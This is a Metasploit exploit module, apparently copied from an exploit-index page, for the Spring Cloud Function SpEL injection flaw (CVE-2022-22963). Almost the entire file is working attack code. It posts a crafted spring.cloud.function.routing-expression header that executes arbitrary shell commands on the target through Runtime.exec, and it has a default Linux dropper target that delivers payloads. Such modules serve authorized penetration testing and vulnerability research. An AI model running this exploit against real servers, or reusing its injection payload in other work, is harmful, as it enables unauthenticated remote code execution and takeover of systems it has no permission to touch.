## https://sploitus.com/exploit?id=MSF:EXPLOIT/MULTI/HTTP/SPRING_CLOUD_FUNCTION_SPEL_INJECTION/
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Spring Cloud Function SpEL Injection',
        'Description' => %q{
          Spring Cloud Function versions prior to 3.1.7 and 3.2.3 are vulnerable to remote code execution due to using
          an unsafe evaluation context with user-provided queries. By crafting a request to the application and setting
          the spring.cloud.function.routing-expression header, an unauthenticated attacker can gain remote code
          execution. Both patched and unpatched servers will respond with a 500 server error and a JSON encoded message.
        },
        'Author' => [
          'm09u3r', # vulnerability discovery
          'hktalent', # github PoC
          'Spencer McIntyre'
        ],
        'References' => [
          ['CVE', '2022-22963'],
          ['URL', 'https://github.com/hktalent/spring-spel-0day-poc'],
          ['URL', 'https://tanzu.vmware.com/security/cve-2022-22963'],
          ['URL', 'https://attackerkb.com/assessments/cda33728-908a-4394-9bd5-d4126557d225']
        ],
        'DisclosureDate' => '2022-03-29',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DefaultOptions' => {
          'RPORT' => 8080,
          'TARGETURI' => '/functionRouter'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'])
    )

    return CheckCode::Unknown unless res

    # both vulnerable and patched servers respond with 500 and a JSON body with these keys
    return CheckCode::Safe unless res.code == 500
    return CheckCode::Safe unless %w[timestamp path status error message].to_set.subset?(res.get_json_document&.keys&.to_set)

    # best we can do is detect that the service is running
    CheckCode::Detected
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'headers' => {
        'spring.cloud.function.routing-expression' => "T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','#{cmd.gsub("'", "''")}'})"
      }
    )

    fail_with(Failure::Unreachable, 'Connection failed') if res.nil?
    fail_with(Failure::UnexpectedReply, 'The server did not respond with the expected 500 error') unless res.code == 500
  end
end
 
